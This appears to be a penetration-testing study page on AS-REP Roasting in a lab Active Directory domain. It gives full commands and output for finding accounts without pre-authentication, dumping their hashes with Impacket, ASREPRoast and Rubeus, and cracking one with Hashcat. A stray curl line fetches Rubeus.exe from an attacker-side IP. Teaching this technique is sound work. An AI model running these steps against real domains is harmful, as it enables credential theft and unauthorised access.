---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# AS-REP Roasting

As discussed [previously](../#operation-details), the first step in Kerberos authentication is the client sending an `AS-REQ` to the `KDC` (the DC in the case of AD). Based on this request, the DC can validate if the authentication is successful. If it is, the domain controller replies with an `AS-REP` containing the session key and TGT. This step is also commonly referred to as [**Kerberos Pre-Authentication**](https://learn.microsoft.com/en-us/archive/technet-wiki/23559.kerberos-pre-authentication-why-it-should-not-be-disabled) and prevents offline password guessing.

Without Kerberos pre-authentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. This attack is known as [**AS-REP Roasting**](https://harmj0y.medium.com/roasting-as-reps-e6179a65216b).

## Finding Targets

By default, the AD user account option _Do not require Kerberos preauthentication_ is disabled, meaning that Kerberos pre-authentication is performed for all users. However, it is possible to enable this account option manually. In assessments, one may find accounts with this option enabled as some applications and technologies require it to function properly.

If already signed in as an authenticated (but otherwise unprivileged) user, one can easily enumerate what users in the domain have this setting with the LDAP filter `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`. This functionality is present in&#x20;

[Enumerate-AD's](../../enumeration/manual.md#enumerate-a-d) `Get-ADUser` command with the `-NoPreauth` flag:

```powershell
Get-DomainUser -NoPreauth
```

When run, the output reveals that dave does not require pre-authentication:

```powershell
PS C:\Users\jeff> Get-ADUser -NoPreauth | Select Name,UAC,SID

Name     UAC SID
----     --- ---
dave 4260352 S-1-5-21-1987370270-658905905-1781884369-1103
```

## Obtaining the Hash

### Impacket

Obtaining a hash can be achieved with [Impacket's](https://github.com/fortra/impacket) [GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py). This tool requires valid credentials as authentication to the DC is required. Impacket has an `apt` installation after which the script can be called with the command:

{% code overflow="wrap" %}
```bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/jeff
```
{% endcode %}

* `-dc-ip` specifies the IP address of the domain controller
* `-request` requests the TGT
* `-outputfile` tells the tool to store the TGT in a file called `hashes.asreprost`
* `corp.com/jeff` is the target authentication information presented in the format `domain/user`
  * This uses the same `jeff` account that was signed in above in the `Get-ADUser` example

When run, the command again finds `dave` and outputs the hashed TGT:

```shell-session
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.192.70  -request -outputfile hashes.asreproast corp.com/jeff
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
----  ----------------------------------------  --------------------------  --------------------------  --------
dave  CN=Development Department,DC=corp,DC=com  2022-09-07 10:54:57.521205  2024-03-27 20:12:28.134636  0x410200 



$krb5asrep$23$dave@CORP.COM:cb773cd06743ec0d36f9ce9a30eae2e2$d5368dae42626c41f61479e7de19202ad884220a7575650498c370301fadcbddfeb7e008e159f14442b6f54b677b07edc087e5c75cf1dda844c26a8591b738263c877384ff77bd1a3588bc041ce38c3b729254b97fb68f34a90ef99abd8663c29264e565d52b96387549e0c41ace91b2a0939bba5352ddb933b1e4d99b86aefda660837bf898c23df8626d296f54fea3ad34f9f25ad78260bd758a3aae53bbe9cb4afcedacdd0ace4f2fbed8ab0df95bf46063d36f4f7db4401bfe78a9e6b0aa6b645946a5ee943bdcdadb013cd7a79c99de329e802b08a265259d3ab91e5df6ea9baacb
```

### Windows

Tools exist to allow has extraction on a Windows machine.

#### ASREPRoast

[`ASREPRoast.ps1`](https://github.com/adaptivethreat/ASREPRoast) is a PowerShell script that can be used to obtain a hash via the command:

```powershell
Get-ASREPHash -UserName "dave" -Domain "corp.com" -Verbose
```

* `-UserName` specifies the user whose hash will be obtained (must have pre-authentication turned off)
* `-Domain` specifies the domain to search against
* `-Verbose` is optional and self-explanatory

When run this would reveal the same hash extracted [above](as-rep-roasting.md#impacket):

```powershell
PS C:\Users\jeff> Get-ASREPHash -UserName "dave" -Domain "corp.com" -Verbose
VERBOSE: [Get-ASREPHash] DC server IP '192.168.192.70' resolved from passed -Domain parameter
VERBOSE: [Get-ASREPHash] Bytes sent to '192.168.192.70': 152
VERBOSE: [Get-ASREPHash] Bytes received from '192.168.192.70': 1416
$krb5asrep$dave@corp.com:1792feeb0a3ecb8037027c5629fa115c$38fe07b40136c3615299d4b24a3c42516984ea0c1caa4358fa57d772ade6ddc8b579a574c5ddf1a3b8dcbe712f9a0b56a2e882b6da2d5118b46fdce2868eb178500347f323da074c15911935da149ad207bb7ebd53ab060a52180ac5892a28317451f5fe0778dafce5f48973241eb547dc69cb1fc72220ac98060427b252bc9f7b23a16a94123bd90644995efca119cc1a8ec2dfc5a94241167bfbf0207f8f068415e1af3bd87122d3cae3339aeec9fef0f4522e523e28f926f694baf1bbfc2ffe41d4bf68395c9bcc4b291c2f5a895f480d1e413b1f02b47501b384f47f2f2887d537ca
```

#### Rubeus

ASREPRoast has actually been deprecated because its functionality was incorporated into [Rubeus](https://github.com/GhostPack/Rubeus). Rubeus's `asreproast` command can be used to mimic the same functionality:curl http://192.168.45.202/windows/exe/active-directory/Rubeus.exe -o .\Rubeus.exe

```sh
.\Rubeus.exe asreproast /nowrap
```

* `/nowrap` prevents new lines being added to the resulting AS-REP hashes

When run the command also finds the same hash:

```shell-session
C:\Users\jeff\Tools>.\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.192.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:594CFD49ECFDBF1FDAA4AD901C60D023$54C7BE9C0B658640F1E05E7C5381552D0C17F44C07531C5AB3164B7FC1F009EFEB258E75987F8303373EC006CD58B8DC06D14B757BEAF05A8FE06263E3FFCF67E34DF88EB19EDEC36A079CED99791EE204E8A8AD8259CEA5C6F751BF385ECDD387C081710688282C7BDBF352BA4CC163BD25CEB831D47DFAE2D490D60A6DA98487129365BBA9AF062B9E826A1638BDF462D446944CB2A84484ACDBF1A6D1A9125A80DD3EF650DB94A64DE0DE6EB6D02EF8904D2A22CB737E9E698FC630F8E14045C3870FE57E1C8ADC9CF3D1588F163496E18B5C69E299B4A633AC5FCBBCB117B930B271
```

## Cracking the Hash

The hash can be cracked with the trusty Hashcat:

```shell-session
kali@kali:~$ hashcat --help | grep Kerberos
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

`18200` is exactly what is needed. The hash can then be cracked with the command:

{% code overflow="wrap" %}
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}

Luckily this is a simple example and this works (and quickly):

```shell-session
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.6) starting

...

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

...

$krb5asrep$23$dave@CORP.COM:cb773cd06743ec0d36f9ce9a30eae2e2$d5368dae42626c41f61479e7de19202ad884220a7575650498c370301fadcbddfeb7e008e159f14442b6f54b677b07edc087e5c75cf1dda844c26a8591b738263c877384ff77bd1a3588bc041ce38c3b729254b97fb68f34a90ef99abd8663c29264e565d52b96387549e0c41ace91b2a0939bba5352ddb933b1e4d99b86aefda660837bf898c23df8626d296f54fea3ad34f9f25ad78260bd758a3aae53bbe9cb4afcedacdd0ace4f2fbed8ab0df95bf46063d36f4f7db4401bfe78a9e6b0aa6b645946a5ee943bdcdadb013cd7a79c99de329e802b08a265259d3ab91e5df6ea9baacb:Flowers1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
...

Started: Wed Mar 27 20:19:10 2024
Stopped: Wed Mar 27 20:20:03 2024
```

The password was revealed to be `Flowers1`. Usually it will not be this simple but this serves as an illustration of the steps for AS-REP Roasting.
